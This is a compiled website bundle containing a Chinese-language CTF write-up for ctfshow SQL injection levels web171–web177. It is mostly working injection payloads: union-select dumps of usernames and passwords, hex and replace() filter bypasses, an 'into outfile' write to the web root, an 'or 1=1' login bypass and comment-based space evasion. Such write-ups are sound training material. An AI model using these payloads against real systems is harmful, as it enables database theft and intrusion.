"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[62],{27233:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>i,contentTitle:()=>t,default:()=>h,frontMatter:()=>l,metadata:()=>s,toc:()=>d});const s=JSON.parse('{"id":"CTF/CTFSHOW/ctfshow-sql\u6ce8\u5165","title":"ctfshow-sql\u6ce8\u5165","description":"web171","source":"@site/docs/CTF/CTFSHOW/ctfshow-sql\u6ce8\u5165.md","sourceDirName":"CTF/CTFSHOW","slug":"/CTF/CTFSHOW/ctfshow-sql\u6ce8\u5165","permalink":"/docs/CTF/CTFSHOW/ctfshow-sql\u6ce8\u5165","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/CTFSHOW/ctfshow-sql\u6ce8\u5165.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"ctfshow-nodejs","permalink":"/docs/CTF/CTFSHOW/ctfshow-nodejs"},"next":{"title":"ctfshow-ssrf","permalink":"/docs/CTF/CTFSHOW/ctfshow-ssrf"}}');var c=r(74848),o=r(28453);const l={},t=void 0,i={},d=[{value:"web171",id:"web171",level:3},{value:"web172",id:"web172",level:3},{value:"web173",id:"web173",level:3},{value:"web174",id:"web174",level:3},{value:"web175",id:"web175",level:3},{value:"web176",id:"web176",level:3},{value:"web177",id:"web177",level:3}];function a(e){const n={blockquote:"blockquote",code:"code",h3:"h3",p:"p",pre:"pre",...(0,o.R)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(n.h3,{id:"web171",children:"web171"}),"\n",(0,c.jsxs)(n.blockquote,{children:["\n",(0,c.jsx)(n.p,{children:"\u51fd\u6570 group_concat(arg) \u53ef\u4ee5\u5408\u5e76\u591a\u884c\u7684\u67d0\u5217(\u6216\u591a\u5217)\u6570\u636e\u4e3a\u4e00\u884c\uff0c\u9ed8\u8ba4\u4ee5\u9017\u53f7\u5206\u9694\u3002"}),"\n"]}),"\n",(0,c.jsx)(n.p,{children:"\u62fc\u63a5sql\u8bed\u53e5\u67e5\u627e\u6307\u5b9aID\u7528\u6237"}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.code,{children:"$sql = \"select username,password from user where username !='flag' and id = '\".$_GET['id'].\"' limit 1;\";"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"1' or 1=1--+\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u5224\u65ad\u5b57\u6bb5\u6570"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"1' order by 3--+\r\n1' order by 4--+\n"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"1' union select 1,2,3 --+\n"})}),"\n",(0,c.jsx)(n.p,{children:"3\u4e2a\u5747\u6709\u56de\u663e"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"1' union select database(),2,3 --+\n"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.code,{children:"ctfshow_web"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='ctfshow_web'--+\n"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='ctfshow_user'--+\n"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"1' union select 1,group_concat(username,password),3 from ctfshow_user --+\n"})}),"\n",(0,c.jsx)(n.h3,{id:"web172",children:"web172"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"1' union select database(),group_concat(username,password) from ctfshow_user2 --+--+\n"})}),"\n",(0,c.jsx)(n.h3,{id:"web173",children:"web173"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"//\u68c0\u67e5\u7ed3\u679c\u662f\u5426\u6709flag\r\n    if(!preg_match('/flag/i', json_encode($ret))){\r\n      $ret['msg']='\u67e5\u8be2\u6210\u529f';\r\n    }\n"})}),"\n",(0,c.jsxs)(n.p,{children:["\u4f7f\u7528",(0,c.jsx)(n.code,{children:"hex()"}),"\u7f16\u7801\u8fdb\u884c\u6861\u8fc7"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"1' union select database(),group_concat(hex(password)),3 from ctfshow_user3 --+\n"})}),"\n",(0,c.jsx)(n.h3,{id:"web174",children:"web174"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"-1' union select replace(username,'g','j'),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I'),'0','J'),'g','j') from ctfshow_user4 where username='flag'--+\n"})}),"\n",(0,c.jsx)(n.h3,{id:"web175",children:"web175"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"//\u68c0\u67e5\u7ed3\u679c\u662f\u5426\u6709flag\r\n    if(!preg_match('/[\\x00-\\x7f]/i', json_encode($ret))){\r\n      $ret['msg']='\u67e5\u8be2\u6210\u529f';\r\n    }\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u8fc7\u6ee4\u4e86ascii 0~127"}),"\n",(0,c.jsx)(n.p,{children:"\u76f4\u63a5\u5199\u6587\u4ef6"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:'1\' union select 1,password from ctfshow_user5 into outfile "/var/www/html/flag"--+\t\n'})}),"\n",(0,c.jsx)(n.h3,{id:"web176",children:"web176"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"1' or 1=1--+\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u4e07\u80fd\u5bc6\u7801\u5c31\u884c"}),"\n",(0,c.jsx)(n.h3,{id:"web177",children:"web177"}),"\n",(0,c.jsxs)(n.p,{children:["\u8fc7\u6ee4\u4e86\u7a7a\u683c\u548c",(0,c.jsx)(n.code,{children:"--+"}),",",(0,c.jsx)(n.code,{children:"#"})]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"1'/**/order/**/by/**/3%23\r\n1'/**/union/**/select/**/1,2,3%23\r\n\r\n1'/**/union/**/select/**/database(),group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema='ctfshow_web'%23\r\n\r\n1'/**/union/**/select/**/database(),group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name='ctfshow_user'%23\r\n\r\n1'/**/union/**/select/**/database(),group_concat(username,password),3/**/from/**/ctfshow_user%23\n"})})]})}function h(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,c.jsx)(n,{...e,children:(0,c.jsx)(a,{...e})}):a(e)}},28453:(e,n,r)=>{r.d(n,{R:()=>l,x:()=>t});var s=r(96540);const c={},o=s.createContext(c);function l(e){const n=s.useContext(o);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:l(e.components),s.createElement(o.Provider,{value:n},e.children)}}}]);